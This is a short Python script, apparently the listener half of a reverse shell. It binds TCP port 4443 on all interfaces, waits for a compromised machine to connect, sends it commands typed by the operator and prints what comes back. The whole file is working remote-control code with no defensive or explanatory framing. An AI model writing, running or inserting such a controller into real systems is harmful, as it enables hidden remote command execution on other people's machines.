#!/usr/bin/python3
import socket
sock = socket.socket()
sock.bind(('0.0.0.0', 4443))
sock.listen(10)
client_socket, client_address = sock.accept()
print(f"{client_address[0]}:{client_address[1]} connection established! 👋")
message = "✨ client connected! 💻".encode()
client_socket.send(message)
while True:
    command = input("🤖 enter cmd: ")
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    results = client_socket.recv(1024).decode()
    print(results)
client_socket.close()
sock.close()